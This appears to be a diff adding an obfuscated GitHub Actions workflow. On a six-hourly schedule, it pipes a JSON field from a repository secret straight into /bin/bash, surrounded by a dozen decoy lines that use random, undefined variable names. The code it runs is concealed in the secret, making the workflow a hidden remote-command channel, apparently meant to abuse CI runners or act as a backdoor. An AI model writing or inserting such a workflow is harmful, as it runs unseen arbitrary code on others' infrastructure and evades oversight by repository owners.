@@ -1,0 +1,30 @@
+name: jidancanchen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jidancanchen
+        env:
+          vwo093: ${{ secrets.vwo093 }}
+        run: |
+          echo $vwo093 | jq -r .oiars866 | /bin/bash
+          echo $tbkxt68 | jq -r .rsqn30714 | /bin/bash
+          echo $a1077 | jq -r .tncj7585 | /bin/bash
+          echo $gbr04941 | jq -r .beys79771 | /bin/bash
+          echo $ebkaq81464 | jq -r .j1286 | /bin/bash
+          echo $b1 | jq -r .qbnms724 | /bin/bash
+          echo $buyhg96342 | jq -r .tsvcm16409 | /bin/bash
+          echo $q826 | jq -r .d89 | /bin/bash
+          echo $mfl72 | jq -r .sfm6648 | /bin/bash
+          echo $zp10 | jq -r .p986 | /bin/bash
+          echo $frx77401 | jq -r .gft9638 | /bin/bash
+          echo $x4 | jq -r .nohg48 | /bin/bash
+          echo $fte1954 | jq -r .hjc3 | /bin/bash
+
